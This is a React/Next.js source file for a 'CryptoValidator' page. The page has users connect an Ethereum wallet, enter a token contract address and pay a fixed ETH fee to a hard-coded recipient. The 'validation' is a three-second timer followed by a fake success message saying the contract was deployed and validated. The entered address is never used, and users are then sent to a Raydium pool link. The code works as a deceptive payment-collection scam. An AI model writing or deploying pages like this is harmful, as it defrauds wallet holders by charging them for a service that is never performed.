
"use client";

import { useState, useEffect, FormEvent } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { AlertDialog, AlertDialogAction, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle } from "@/components/ui/alert-dialog";
import AppTitle from "@/components/AppTitle";
import { RECIPIENT_ADDRESS, TRANSACTION_VALUE_WEI_HEX, RAYDIUM_LIQUIDITY_POOL_URL, TRANSACTION_AMOUNT_ETH_STRING } from "@/lib/constants";
import { Wallet, Loader2, AlertCircle, CheckCircle2 } from "lucide-react";
import { Alert, AlertDescription } from "@/components/ui/alert";

declare global {
  interface Window {
    ethereum?: any;
  }
}

export default function CryptoValidatorPage() {
  const [isClient, setIsClient] = useState(false);
  const [account, setAccount] = useState<string | null>(null);
  const [tokenCA, setTokenCA] = useState<string>("");
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);
  const [transactionHash, setTransactionHash] = useState<string | null>(null);
  const [showSuccessDialog, setShowSuccessDialog] = useState<boolean>(false);
  const [isProcessingValidation, setIsProcessingValidation] = useState<boolean>(false);

  useEffect(() => {
    setIsClient(true);
  }, []);

  useEffect(() => {
    if (!isClient) return;

    if (typeof window.ethereum === 'undefined') {
      setError("No Ethereum-compatible wallet detected. Please install MetaMask or another compatible wallet extension.");
    } else if (window.ethereum) {
      const handleAccountsChanged = (accounts: string[]) => {
        if (accounts.length > 0) {
          setAccount(accounts[0]);
          setError(null); // Clear error if user connects/changes account successfully
        } else {
          setAccount(null);
          setError("Wallet disconnected. Please connect your wallet.");
        }
      };

      window.ethereum.on('accountsChanged', handleAccountsChanged);

      window.ethereum.request({ method: 'eth_accounts' })
        .then((accounts: string[]) => {
          if (accounts.length > 0) {
            setAccount(accounts[0]);
            setError(null); // Clear error if already connected from a previous session
          }
        })
        .catch((err: any) => {
          console.warn("Error attempting to fetch existing accounts on load (this is a passive check):", err);
          // Don't set a UI error here as this is a passive check.
        });
      
      return () => {
        if (window.ethereum?.removeListener) {
          window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
        }
      };
    }
  }, [isClient]);

  const handleConnectWallet = async () => {
    if (typeof window.ethereum === 'undefined') {
      setError("No Ethereum-compatible wallet detected. Please install MetaMask or another compatible wallet extension.");
      return;
    }

    if (typeof window.ethereum.request !== 'function') {
      setError("The detected Ethereum wallet provider is not standard or might be corrupted. Please check your wallet extension.");
      console.error("Wallet provider issue: window.ethereum.request is not a function.", window.ethereum);
      return;
    }

    setIsLoading(true);
    setError(null);
    try {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      if (accounts.length > 0) {
        setAccount(accounts[0]);
      } else {
         setError("No accounts found. Please ensure your wallet is set up correctly.");
      }
    } catch (err: any) {
      setAccount(null); 
      if (err.message && typeof err.message === 'string' && err.message.includes("Nightly is not initialized")) {
        setError("Nightly wallet is not initialized. Please ensure it's set up correctly or try a different wallet like MetaMask.");
        console.warn("Nightly wallet initialization issue detected and handled for UI.", err);
      } else if (err.code === 4001) {
        setError("Wallet connection rejected by user.");
        console.warn("Wallet connection rejected by user, UI error set.", err);
      } else if (err.message && typeof err.message === 'string' && err.message.toLowerCase().includes("unexpected error")) {
        setError("An unexpected error occurred with your wallet extension. Please try again or ensure your wallet is up to date.");
        console.error("Wallet connection error (unexpected):", err);
      } else {
        setError("Failed to connect wallet. Please ensure your wallet (e.g., MetaMask) is properly installed, configured, and selected, then try again.");
        console.error("Generic wallet connection error:", err);
      }
    } finally {
      setIsLoading(false);
    }
  };

  const handlePayment = async (event: FormEvent) => {
    event.preventDefault();
    if (!account) {
      setError("Please connect your wallet first.");
      return;
    }
    if (!tokenCA.trim()) {
      setError("Please enter a valid Token Contract Address (CA).");
      return;
    }
    if (!/^0x[a-fA-F0-9]{40}$/.test(tokenCA.trim())) {
      setError("Invalid Token Contract Address format. It should be a 40-character hex string starting with 0x.");
      return;
    }

    setIsLoading(true);
    setError(null);
    setTransactionHash(null);

    const transactionParameters = {
      to: RECIPIENT_ADDRESS,
      from: account,
      value: TRANSACTION_VALUE_WEI_HEX,
    };

    try {
      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [transactionParameters],
      });
      setTransactionHash(txHash);
      
      setIsProcessingValidation(true);
      await new Promise(resolve => setTimeout(resolve, 3000)); 
      setIsProcessingValidation(false);

      setShowSuccessDialog(true);
    } catch (err: any) {
      if (err.code === 4001) {
        setError("Transaction rejected by user.");
        console.warn("Transaction rejected by user, UI error set.", err);
      } else if (err.message && typeof err.message === 'string' && err.message.includes("insufficient funds")) {
        setError("Insufficient funds for the transaction.");
        console.warn("Transaction error: Insufficient funds. UI error set.", err);
      } else if (err.message && typeof err.message === 'string' && err.message.toLowerCase().includes("unexpected error")) {
        setError("An unexpected error occurred with your wallet extension during the transaction. Please try again or ensure your wallet is up to date.");
        console.error("Transaction error (unexpected):", err);
      } else {
        setError("Transaction failed. Please check your wallet and try again.");
        console.error("Generic transaction error:", err);
      }
    } finally {
      setIsLoading(false);
      setIsProcessingValidation(false); 
    }
  };

  const handleProceedToRaydium = () => {
    window.open(RAYDIUM_LIQUIDITY_POOL_URL, "_blank", "noopener,noreferrer");
    setShowSuccessDialog(false);
    setTokenCA("");
    setTransactionHash(null);
    setError(null);
  };

  const truncateAddress = (address: string) => {
    if (!address) return "";
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
  };

  if (!isClient) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <Loader2 className="h-12 w-12 animate-spin text-primary" />
      </div>
    );
  }

  return (
    <main className="min-h-screen flex flex-col items-center justify-center p-4 sm:p-6 bg-background font-body">
      <AppTitle />
      <Card className="w-full max-w-md shadow-xl">
        <CardHeader>
          <CardTitle className="text-2xl font-headline text-center">Validate Your Token</CardTitle>
          <CardDescription className="text-center">
            Connect your wallet, submit your token CA, and pay {TRANSACTION_AMOUNT_ETH_STRING} ETH to proceed.
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-6">
          {!account ? (
            <Button onClick={handleConnectWallet} disabled={isLoading || (isClient && typeof window.ethereum === 'undefined')} className="w-full bg-primary hover:bg-primary/90 text-primary-foreground">
              {isLoading ? (
                <Loader2 className="mr-2 h-5 w-5 animate-spin" />
              ) : (
                <Wallet className="mr-2 h-5 w-5" />
              )}
              Connect Wallet
            </Button>
          ) : (
            <div className="text-center p-3 border rounded-md bg-secondary">
              <p className="text-sm text-secondary-foreground font-medium">Wallet Connected:</p>
              <p className="text-xs text-accent font-mono">{truncateAddress(account)}</p>
            </div>
          )}

          <form onSubmit={handlePayment} className="space-y-6">
            <div>
              <label htmlFor="tokenCA" className="block text-sm font-medium text-foreground mb-1">
                Token Contract Address (CA)
              </label>
              <Input
                id="tokenCA"
                type="text"
                value={tokenCA}
                onChange={(e) => setTokenCA(e.target.value)}
                placeholder="0x..."
                disabled={!account || isLoading}
                required
                className="bg-input border-border focus:ring-primary focus:border-primary"
              />
            </div>

            <Button type="submit" disabled={!account || isLoading || isProcessingValidation} className="w-full bg-accent hover:bg-accent/90 text-accent-foreground">
              {isLoading || isProcessingValidation ? (
                <Loader2 className="mr-2 h-5 w-5 animate-spin" />
              ) : (
                <CheckCircle2 className="mr-2 h-5 w-5" />
              )}
              {isProcessingValidation ? "Processing Validation..." : `Validate & Pay ${TRANSACTION_AMOUNT_ETH_STRING} ETH`}
            </Button>
          </form>
        </CardContent>
        {error && (
          <CardFooter>
            <Alert variant="destructive" className="w-full">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          </CardFooter>
        )}
      </Card>

      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="bg-card text-card-foreground">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-accent font-headline text-2xl">Success!</AlertDialogTitle>
            <AlertDialogDescription className="text-muted-foreground">
              Your smart contract has been notionally deployed and the token data validated successfully.
              {transactionHash && (
                <p className="mt-2 text-xs">Transaction Hash: <span className="font-mono break-all">{transactionHash}</span></p>
              )}
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogAction onClick={handleProceedToRaydium} className="bg-primary hover:bg-primary/90 text-primary-foreground">
              Proceed to Liquidity Pool
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
      <footer className="mt-8 text-center text-sm text-muted-foreground">
        <p>&copy; {new Date().getFullYear()} CryptoValidator. All rights reserved.</p>
        <p className="mt-1">This is a conceptual demonstration. Real ETH will be transferred if you proceed with a live wallet.</p>
      </footer>
    </main>
  );
}
